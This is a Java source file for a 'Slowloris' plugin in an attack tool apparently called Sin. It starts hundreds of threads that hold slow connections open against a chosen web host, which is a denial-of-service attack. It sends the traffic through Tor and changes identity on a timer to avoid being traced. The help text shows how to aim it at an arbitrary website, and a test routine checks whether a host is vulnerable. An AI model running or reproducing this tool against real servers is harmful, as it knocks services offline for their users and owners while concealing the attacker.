 package com.sin.plugins;
 
 import com.sin.plugins.api.SinOutput;
 import com.sin.plugins.api.SinPlugin;
 
 public class Slowloris implements SinPlugin
 {
 	private SlowlorisThread[] threads;
 	private TorIdentityHandler torHandler;
 	
     public String getName() {
         return "Slowloris";
     }
 
 	@Override
 	public void start(String[] args) {
 		
 		Config.parseArgs(args);
 		SinOutput.positive(getName() + " has been started");
 		
 		if(Config.tor)
 		{
 			SinOutput.positive("Initiating Tor");
 			torHandler = new TorIdentityHandler(Config.torPassword, Config.torChange);
 			torHandler.start();
 		}
 		
 		SinOutput.positive("Starting " + Config.numThreads + " threads");
 		threads = new SlowlorisThread[Config.numThreads];
 		
 		for(int i = 0; i < Config.numThreads; ++i)
 		{
 			threads[i] = new SlowlorisThread(Config.host, Config.port, Config.connections, Config.timeout, Config.tor);
 			threads[i].start();
 			
 			try 
 			{
 				Thread.sleep(20);
 			} 
 			catch (InterruptedException e) 
 			{
 				e.printStackTrace();
 			}
 		}
 		
 		for(int i = 0; i < Config.numThreads; ++i)
 		{
 			try 
 			{
 				threads[i].join();
 			} 
 			catch (InterruptedException e) 
 			{
 				e.printStackTrace();
 			}
 		}
 		
 		SinOutput.positive("Finished starting threads");
 		
 	}
 
 	@Override
 	public void help() {
 		SinOutput.out("~= Slowloris help menu =~");
 		SinOutput.out("Arguments: host:port:connections:threads:timeout:tor:torPassword:torChange:verbose\n");
 		SinOutput.out("host - Target host to attack, default localhost");
 		SinOutput.out("port - Target host port, default 80");
 		SinOutput.out("connections - Connections to open per thread, default 2");
 		SinOutput.out("threads - Number of threads to open, default 500");
 		SinOutput.out("timeout - Time in seconds to wait between data sending, default 60");
 		SinOutput.out("tor - Use tor or not 1/0, default 1");
 		SinOutput.out("torPassword - Password to your local Tor service, default ''");
 		SinOutput.out("torChange - The time in seconds between Tor identity change, default 10");
 		SinOutput.out("verbose - Be verbose and output more data 1/0, default 0\n");
 		SinOutput.out("Example: java Sin.jar --plugin Slowloris --args \"somewebsite.topdomain:80:2:1000:250:1:password:10:0\"");
 	}
 
 	@Override
 	public String getVersion() {
 		return Config.version;
 	}
 
 	@Override
 	public int test(String[] args) 
 	{
 		int time1 = 0;
 		int time2 = 0;
 		
		SinOutput.out("Slowloris test initiating ..");
 		
 		time1 = SlowHelper.slowlorisT2P1(args[0], args[1]);
 		
 		SinOutput.positive("Normal timeout took " + time1 + " seconds");
 		
 		time2 = SlowHelper.slowlorisT2P2(args[0], args[1], time1/2);
 		
 		if((time1+(time1/4)) < time2)
 		{
 			SinOutput.positive("Host seems vulnerable!");
 			SinOutput.positive("Normal timeout: " + time1);
 			SinOutput.positive("Extended timeout: " + time2);
 		}
 		else
 		{
 			SinOutput.negative("Host does not seem vulnerable");
 			SinOutput.positive("Normal timeout: " + time1);
 			SinOutput.positive("Extended timeout: " + time2);
 		}
 
 		return 0;
 	}
 
 	@Override
 	public String getDescription() {
 		return "Slowloris plugin for Sin";
 	}
 }
